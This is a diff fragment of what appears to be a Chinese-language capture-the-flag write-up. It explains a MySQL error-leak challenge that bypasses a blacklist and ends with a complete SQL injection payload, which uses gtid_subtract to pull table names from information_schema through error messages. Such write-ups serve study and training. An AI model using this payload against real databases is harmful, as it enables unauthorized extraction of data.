@@ -40,7 +40,7 @@ except Exception as e:
 # omitted...
 ```
 
-可以看出，这是对 `MySQL Error Leak` 进行利用的题目。不过做了很多黑名单，我们需要绕过这些黑名单，错误信息的泄露用的是 `gtid_substract` 。最后得到的注入的 `SQL` 语句如下：
+可以看出，这是对 `MySQL Error Leak` 进行利用的题目。不过做了很多黑名单，我们需要绕过这些黑名单，错误信息的泄露用的是 `gtid_substract` 。最后得到的注入的 `SQL` 语句如下：
 
 ```
 select uid, username, password from users where username = 'abc'and(select(gtid_subtract((select(right(group_concat(table_name),hex('F')))from(information_schema.tables)),'A')))#'
